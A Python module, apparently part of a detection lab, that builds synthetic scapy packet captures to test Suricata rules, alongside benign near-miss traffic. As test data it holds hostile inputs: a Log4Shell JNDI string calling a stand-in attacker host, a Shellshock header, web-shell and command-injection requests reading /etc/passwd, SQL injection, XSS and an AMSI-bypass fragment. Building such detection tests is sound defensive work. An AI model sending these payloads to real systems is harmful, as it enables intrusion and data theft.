"""Build the packet captures that exercise the Suricata rules.

Every capture is synthetic and built with scapy: complete TCP sessions with
valid sequence numbers so Suricata's stream and protocol parsers accept them.
One capture exists for each rule, plus a capture of ordinary traffic that must
raise no alert. `python -m detlab build-pcaps` writes them to simulations/pcaps/.

Addresses: 10.10.20.0/24 is the lab network. 203.0.113.0/24 and 198.51.100.0/24
are documentation ranges and stand for the internet.
"""

from collections.abc import Sequence

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Packet, Raw

BASE_TIME = 1794300000.0      # fixed, so rebuilt captures are identical
CLIENT = "10.10.20.15"        # workstation in the lab network
SERVER = "10.10.20.80"        # web server in the lab network
RESOLVER = "10.10.20.2"
ATTACKER = "203.0.113.10"
INTERNET = "198.51.100.25"
MAC = {CLIENT: "02:00:00:00:00:15", SERVER: "02:00:00:00:00:80", RESOLVER: "02:00:00:00:00:02",
       ATTACKER: "02:00:00:00:01:10", INTERNET: "02:00:00:00:01:25"}


class Capture:
    """Collects packets and gives each one a timestamp."""

    def __init__(self, step: float = 0.01):
        self.packets: list[Packet] = []
        self.clock = BASE_TIME
        self.step = step

    def add(self, packet: Packet) -> None:
        self.clock += self.step
        packet.time = self.clock
        self.packets.append(packet)

    def wait(self, seconds: float) -> None:
        self.clock += seconds


def _ip(src: str, dst: str) -> Packet:
    return Ether(src=MAC[src], dst=MAC[dst]) / IP(src=src, dst=dst, ttl=64)


def tcp_session(capture: Capture, client: str, server: str, sport: int, dport: int,
                exchanges: Sequence[tuple[bytes, bytes]]) -> None:
    """A full TCP conversation: handshake, request and response pairs, orderly close."""
    client_seq, server_seq = 1000, 5000
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="S", seq=client_seq))
    capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="SA", seq=server_seq, ack=client_seq + 1))
    client_seq += 1
    server_seq += 1
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="A", seq=client_seq, ack=server_seq))
    for request, response in exchanges:
        if request:
            capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="PA", seq=client_seq,
                                                  ack=server_seq) / Raw(request))
            client_seq += len(request)
            capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="A", seq=server_seq,
                                                  ack=client_seq))
        if response:
            for start in range(0, len(response), 1400):
                chunk = response[start:start + 1400]
                capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="PA", seq=server_seq,
                                                      ack=client_seq) / Raw(chunk))
                server_seq += len(chunk)
            capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="A", seq=client_seq,
                                                  ack=server_seq))
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="FA", seq=client_seq, ack=server_seq))
    capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="FA", seq=server_seq, ack=client_seq + 1))
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="A", seq=client_seq + 1,
                                          ack=server_seq + 1))


def refused_connection(capture: Capture, client: str, server: str, sport: int, dport: int) -> None:
    """A SYN answered with a reset: a closed port or a login attempt that never completes."""
    capture.add(_ip(client, server) / TCP(sport=sport, dport=dport, flags="S", seq=2000))
    capture.add(_ip(server, client) / TCP(sport=dport, dport=sport, flags="RA", seq=0, ack=2001))


def dns_lookup(capture: Capture, client: str, name: str, answer: str = "198.51.100.25", sport: int = 53001) -> None:
    capture.add(_ip(client, RESOLVER) / UDP(sport=sport, dport=53) / DNS(id=sport, rd=1, qd=DNSQR(qname=name)))
    capture.add(_ip(RESOLVER, client) / UDP(sport=53, dport=sport)
                / DNS(id=sport, qr=1, rd=1, ra=1, qd=DNSQR(qname=name), an=DNSRR(rrname=name, ttl=60, rdata=answer)))


def http_request(method: str, path: str, host: str, headers: dict[str, str], body: bytes = b"") -> bytes:
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    lines += [f"{key}: {value}" for key, value in headers.items()]
    if body:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def http_response(body: bytes, content_type: str = "text/html", status: str = "200 OK") -> bytes:
    head = (f"HTTP/1.1 {status}\r\nServer: nginx\r\nContent-Type: {content_type}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    return head.encode() + body


BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36"
POWERSHELL_AGENT = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4648"
PAGE = b"<html><body><h1>It works</h1></body></html>"
# The start of a PE file header and nothing more. It is not a program.
FAKE_EXE = b"MZ" + b"\x90\x00" * 31 + b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21" \
    + b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 200


def smb_message(name: str) -> bytes:
    """A NetBIOS session message with an SMB2 header and a UTF-16 name, as a create request carries it."""
    body = b"\xfeSMB" + b"\x40\x00" + b"\x00" * 58 + name.encode("utf-16-le")
    return b"\x00" + len(body).to_bytes(3, "big") + body


def zip_header(encrypted: bool) -> bytes:
    """The local file header of a ZIP archive and some filler. Bit 0 of the flags marks encryption."""
    flags = b"\x01\x00" if encrypted else b"\x00\x00"
    return b"PK\x03\x04" + b"\x14\x00" + flags + b"\x08\x00" + b"\x00" * 16 + b"\x08\x00\x00\x00" + b"data.bin" \
        + b"lab sample " * 20


def tls_client_hello(server_name: str) -> bytes:
    """A TLS 1.2 ClientHello record with a server name, built by hand."""
    name = server_name.encode()
    sni = b"\x00\x00" + (len(name) + 5).to_bytes(2, "big") + (len(name) + 3).to_bytes(2, "big") + b"\x00" \
        + len(name).to_bytes(2, "big") + name
    extensions = sni + b"\x00\x0b\x00\x02\x01\x00" + b"\x00\x0a\x00\x04\x00\x02\x00\x17"
    body = (b"\x03\x03" + bytes(range(32)) + b"\x00"
            + b"\x00\x04\xc0\x2f\x00\x9c" + b"\x01\x00"
            + len(extensions).to_bytes(2, "big") + extensions)
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(handshake).to_bytes(2, "big") + handshake


def build() -> dict[str, tuple[list[Packet], list[int]]]:
    """Capture name -> (packets, SIDs that must fire on it)."""
    captures: dict[str, tuple[list[Packet], list[int]]] = {}

    c = Capture()
    dns_lookup(c, CLIENT, "c2-update.duckdns.org", ATTACKER)
    captures["dns_ddns_provider"] = (c.packets, [1000020])

    c = Capture()
    label = "6e6f7468696e6720746f2073656520686572652c206a7573742061206c6162"
    dns_lookup(c, CLIENT, f"{label}.{label[:40]}.t.lab-tunnel.com", ATTACKER)
    captures["dns_tunnel"] = (c.packets, [1000021])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49201, 80, [(
        http_request("GET", "/stage/run.ps1", ATTACKER, {"User-Agent": POWERSHELL_AGENT}),
        http_response(b"Write-Host 'lab sample, does nothing'\n", "text/plain"))])
    captures["http_powershell_download"] = (c.packets, [1000022])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49202, 80, [(
        http_request("GET", "/files/setup.bin", "downloads.lab-example.com", {"User-Agent": BROWSER}),
        http_response(FAKE_EXE, "application/octet-stream"))])
    captures["http_executable_download"] = (c.packets, [1000024])

    c = Capture()
    tcp_session(c, ATTACKER, SERVER, 40101, 80, [(
        http_request("GET", "/", "shop.lab-example.com",
                     {"User-Agent": "${jndi:ldap://203.0.113.10:1389/a}", "Accept": "*/*"}),
        http_response(PAGE))])
    tcp_session(c, ATTACKER, SERVER, 40102, 80, [(
        http_request("GET", "/search?q=${jndi:ldap://203.0.113.10:1389/a}", "shop.lab-example.com",
                     {"User-Agent": "curl/8.5.0"}),
        http_response(PAGE))])
    captures["http_log4shell"] = (c.packets, [1000085, 1000086])

    c = Capture()
    tcp_session(c, ATTACKER, SERVER, 40103, 80, [(
        http_request("GET", "/cgi-bin/status", "shop.lab-example.com",
                     {"User-Agent": "() { :; }; /bin/bash -c 'id'"}),
        http_response(b"ok\n", "text/plain"))])
    captures["http_shellshock"] = (c.packets, [1000087])

    c = Capture()
    tcp_session(c, ATTACKER, SERVER, 40104, 80, [(
        http_request("GET", "/uploads/img.php?cmd=whoami", "shop.lab-example.com", {"User-Agent": "curl/8.5.0"}),
        http_response(b"www-data\n", "text/plain"))])
    captures["http_web_shell"] = (c.packets, [1000088])

    c = Capture(step=0.2)
    for attempt in range(12):
        refused_connection(c, ATTACKER, SERVER, 41000 + attempt, 22)
        c.wait(1.5)
    captures["ssh_brute_force"] = (c.packets, [1000010])

    c = Capture(step=0.01)
    for port in range(1, 121):
        if port == 22:
            continue
        refused_connection(c, ATTACKER, SERVER, 42000 + port, port)
    captures["tcp_port_scan"] = (c.packets, [1000001])

    c = Capture()
    c.add(_ip(CLIENT, ATTACKER) / ICMP(type=8, id=7, seq=1) / Raw(b"lab-tunnel-data " * 64))
    c.add(_ip(ATTACKER, CLIENT) / ICMP(type=0, id=7, seq=1) / Raw(b"lab-tunnel-data " * 64))
    captures["icmp_tunnel"] = (c.packets, [1000029])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49203, 443, [(tls_client_hello("a1b2c3d4.ngrok.io"), b"")])
    captures["tls_tunnel_service"] = (c.packets, [1000028])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49204, 3333, [(
        b'{"id":1,"method":"mining.subscribe","params":["lab-miner/1.0"]}\n',
        b'{"id":1,"result":[[["mining.notify","1"]],"00",4],"error":null}\n')])
    captures["stratum_mining"] = (c.packets, [1000090])

    # --- Rules that came from the first version of the lab ---------------------------------------

    for name, flags, sid in (("tcp_null_scan", 0, 1000003), ("tcp_xmas_scan", "FPU", 1000004),
                             ("tcp_fin_scan", "F", 1000005)):
        c = Capture()
        for port in (22, 80, 443, 3389):
            c.add(_ip(ATTACKER, SERVER) / TCP(sport=43000 + port, dport=port, flags=flags, seq=3000))
        captures[name] = (c.packets, [sid])

    for name, port, sid in (("rdp_brute_force", 3389, 1000011), ("smb_brute_force", 445, 1000013)):
        c = Capture(step=0.2)
        for attempt in range(12):
            refused_connection(c, ATTACKER, SERVER, 44000 + attempt, port)
            c.wait(1.5)
        captures[name] = (c.packets, [sid])

    c = Capture(step=0.05)
    for attempt in range(12):
        tcp_session(c, ATTACKER, SERVER, 45000 + attempt, 21, [
            (b"", b"220 lab FTP ready\r\n"), (b"USER admin\r\n", b"331 Password required\r\n"),
            (f"PASS guess{attempt}\r\n".encode(), b"530 Login incorrect\r\n")])
        c.wait(1)
    captures["ftp_brute_force"] = (c.packets, [1000012])

    c = Capture()
    tcp_session(c, CLIENT, SERVER, 49401, 389, [(
        b"0\x3b\x02\x01\x02c6\x04\x11dc=lab,dc=example\n\x01\x02\n\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00"
        b"\xa3\x11\x04\x0bobjectClass\x04\x04user(objectClass=user)",
        b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00")])
    captures["ldap_user_enumeration"] = (c.packets, [1000051])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49402, 80, [(
        http_request("GET", "/tools/install.sh", "tools.lab-example.com", {"User-Agent": "curl/8.5.0"}),
        http_response(b"echo lab sample, does nothing\n", "text/plain"))])
    captures["http_curl_download"] = (c.packets, [1000023])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49403, 80, [(
        http_request("POST", "/submit.php?id=48213", ATTACKER, {"User-Agent": BROWSER,
                                                                "Content-Type": "application/octet-stream"},
                     b"lab sample body, not a beacon"),
        http_response(b"", "text/plain"))])
    captures["http_cobalt_strike_uri"] = (c.packets, [1000025])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49404, 4444, [(b"lab sample, not a payload\n", b"ok\n")])
    captures["tcp_port_4444"] = (c.packets, [1000027])

    for name, pipe, sid in (("smb_psexec_service", "PSEXESVC", 1000030),
                            ("smb_service_control_pipe", "svcctl", 1000033),
                            ("smb_task_scheduler_pipe", "atsvc", 1000060)):
        c = Capture()
        tcp_session(c, CLIENT, SERVER, 49410 + sid % 100, 445, [(smb_message(pipe), b"")])
        captures[name] = (c.packets, [sid])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49405, 80, [(
        http_request("POST", "/upload", "files.lab-example.com", {"User-Agent": BROWSER,
                                                                  "Content-Type": "application/zip"},
                     zip_header(encrypted=True)),
        http_response(b"stored\n", "text/plain"))])
    captures["http_encrypted_zip_upload"] = (c.packets, [1000043])

    c = Capture()
    tcp_session(c, CLIENT, ATTACKER, 49406, 80, [(
        http_request("GET", "/docs/notes.txt", "pastes.lab-example.com", {"User-Agent": BROWSER}),
        http_response(b"# lab sample text, not a working bypass\n[Ref].Assembly.GetType('x.AmsiUtils')"
                      b".GetField('amsiInitFailed')\n", "text/plain"))])
    captures["http_amsi_bypass_download"] = (c.packets, [1000071])

    for name, path, sid in (
            ("http_sqli_union_select", "/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
             1000080),
            ("http_sqli_or_true", "/login.php?user=admin%27%20OR%20%271%27=%271", 1000081),
            ("http_xss_script_tag", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 1000082),
            ("http_directory_traversal", "/download?file=../../../../etc/passwd", 1000083),
            ("http_command_injection", "/ping.php?host=127.0.0.1;cat%20/etc/passwd", 1000084)):
        c = Capture()
        tcp_session(c, ATTACKER, SERVER, 40400 + sid % 100, 80, [(
            http_request("GET", path, "shop.lab-example.com", {"User-Agent": BROWSER}), http_response(PAGE))])
        captures[name] = (c.packets, [sid])

    # Ordinary traffic. Nothing here may raise an alert.
    c = Capture(step=0.05)
    dns_lookup(c, CLIENT, "www.example.com")
    dns_lookup(c, CLIENT, "updates.lab-example.com", sport=53002)
    tcp_session(c, CLIENT, INTERNET, 49301, 80, [(
        http_request("GET", "/index.html", "www.example.com", {"User-Agent": BROWSER}), http_response(PAGE))])
    tcp_session(c, CLIENT, INTERNET, 49302, 80, [(
        http_request("GET", "/docs/guide.pdf?page=2", "www.example.com", {"User-Agent": BROWSER}),
        http_response(b"%PDF-1.7 lab sample", "application/pdf"))])
    tcp_session(c, INTERNET, SERVER, 40201, 80, [(
        http_request("GET", "/products.php?id=42&sort=name", "shop.lab-example.com", {"User-Agent": BROWSER}),
        http_response(PAGE))])
    tcp_session(c, CLIENT, INTERNET, 49303, 443, [(tls_client_hello("www.example.com"), b"")])
    for attempt in range(3):
        banner = b"SSH-2.0-OpenSSH_9.6\r\n"
        tcp_session(c, INTERNET, SERVER, 40300 + attempt, 22, [(banner, banner)])
        c.wait(20)
    # Near misses for the rules above: the same kind of traffic, below each rule's line.
    for port in (3389, 445):
        for attempt in range(3):
            refused_connection(c, INTERNET, SERVER, 40500 + port % 100 + attempt, port)
            c.wait(15)
    for attempt in range(2):
        tcp_session(c, INTERNET, SERVER, 40600 + attempt, 21, [
            (b"", b"220 lab FTP ready\r\n"), (b"USER deploy\r\n", b"331 Password required\r\n")])
    tcp_session(c, CLIENT, SERVER, 49501, 389, [(b"0\x20\x02\x01\x02c\x1b(objectClass=computer)",
                                                 b"0\x0c\x02\x01\x02e\x07")])
    tcp_session(c, CLIENT, INTERNET, 49502, 80, [(
        http_request("GET", "/api/status", "api.lab-example.com", {"User-Agent": "curl/8.5.0"}),
        http_response(b'{"status":"ok"}', "application/json"))])
    tcp_session(c, CLIENT, INTERNET, 49503, 80, [(
        http_request("POST", "/forms/submit.php?id=7", "www.example.com", {"User-Agent": BROWSER,
                     "Content-Type": "application/x-www-form-urlencoded"}, b"name=lab"),
        http_response(PAGE))])
    tcp_session(c, CLIENT, INTERNET, 49504, 4445, [(b"hello\n", b"hello\n")])
    tcp_session(c, CLIENT, SERVER, 49505, 445, [(smb_message("Finance"), b"")])
    tcp_session(c, CLIENT, INTERNET, 49506, 80, [(
        http_request("POST", "/upload", "files.lab-example.com", {"User-Agent": BROWSER,
                     "Content-Type": "application/zip"}, zip_header(encrypted=False)),
        http_response(b"stored\n", "text/plain"))])
    tcp_session(c, CLIENT, INTERNET, 49507, 80, [(
        http_request("GET", "/docs/amsi.html", "docs.lab-example.com", {"User-Agent": BROWSER}),
        http_response(b"<html><body>The Antimalware Scan Interface (AMSI) lets products scan scripts.</body></html>"))])
    for number, path in enumerate(["/blog/union-square-select-hotels", "/search?q=o%27reilly%20or%20similar",
                                   "/docs/../images/logo.png", "/list?sort=name&order=id", "/js/script-library.js"]):
        tcp_session(c, INTERNET, SERVER, 40700 + number, 80, [(
            http_request("GET", path, "shop.lab-example.com", {"User-Agent": BROWSER}), http_response(PAGE))])
    c.add(_ip(CLIENT, INTERNET) / ICMP(type=8, id=9, seq=1) / Raw(b"abcdefghijklmnopqrstuvwabcdefghi" * 2))
    c.add(_ip(INTERNET, CLIENT) / ICMP(type=0, id=9, seq=1) / Raw(b"abcdefghijklmnopqrstuvwabcdefghi" * 2))
    captures["benign_traffic"] = (c.packets, [])
    return captures
